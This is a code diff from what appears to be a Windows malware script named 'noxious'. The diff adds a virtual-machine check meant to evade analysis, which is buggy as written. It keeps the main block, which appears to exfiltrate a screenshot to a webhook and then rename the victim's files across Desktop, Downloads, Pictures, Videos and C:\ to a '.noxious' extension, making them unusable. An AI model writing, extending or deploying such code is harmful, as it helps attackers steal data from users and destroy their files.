@@ -273,22 +273,25 @@ def get_nox():
 
 
 if __name__ == '__main__':
-    get_nox()
-    n0x(webhook)
-    os.remove("screenshot.png")
-    sjik()
-    pc_name = getenv("COMPUTERNAME")
-    directories = [f"C:\\Users\\{pc_name}\\Desktop", 
-                   f"C:\\Users\\{pc_name}\\Videos",
-                   f"C:\\Users\\{pc_name}\\Downloads",
-                   f"C:\\Users\\{pc_name}\\Pictures",
-                   f"C:\\"] 
-    
-    old_ext = ".exe", ".png", ".jpg", ".gif", ".mp3", ".mp4", ".py", ".bat","py",".zip",".docs",".pdf", 
-    ".txt", ".docx", ".xlsx", ".pptx", ".ppt", ".doc", ".xls", ".odt", ".ods", ".odp", ".rtf", ".avi", 
-    ".mov", ".mkv", ".flv", ".wmv", ".swf", ".wav", ".mpg", ".mpeg", ".vob", ".mp4", ".webm", ".m4v", 
-    ".flv", ".f4v", ".f4p", ".f4a", ".f4b", ".m4b", ".m4r", ".m4v", ".3gp"
-    new_ext = ".noxious"  
-    
-    for directory in directories:
-        change_extension(directory, old_ext, new_ext)
+    if check_vm == True:
+        os._exit
+    else:
+        get_nox()
+        n0x(webhook)
+        os.remove("screenshot.png")
+        sjik()
+        pc_name = getenv("COMPUTERNAME")
+        directories = [f"C:\\Users\\{pc_name}\\Desktop", 
+                       f"C:\\Users\\{pc_name}\\Videos",
+                       f"C:\\Users\\{pc_name}\\Downloads",
+                       f"C:\\Users\\{pc_name}\\Pictures",
+                       f"C:\\"] 
+        
+        old_ext = ".exe", ".png", ".jpg", ".gif", ".mp3", ".mp4", ".py", ".bat","py",".zip",".docs",".pdf", 
+        ".txt", ".docx", ".xlsx", ".pptx", ".ppt", ".doc", ".xls", ".odt", ".ods", ".odp", ".rtf", ".avi", 
+        ".mov", ".mkv", ".flv", ".wmv", ".swf", ".wav", ".mpg", ".mpeg", ".vob", ".mp4", ".webm", ".m4v", 
+        ".flv", ".f4v", ".f4p", ".f4a", ".f4b", ".m4b", ".m4r", ".m4v", ".3gp"
+        new_ext = ".noxious"  
+        
+        for directory in directories:
+            change_extension(directory, old_ext, new_ext)
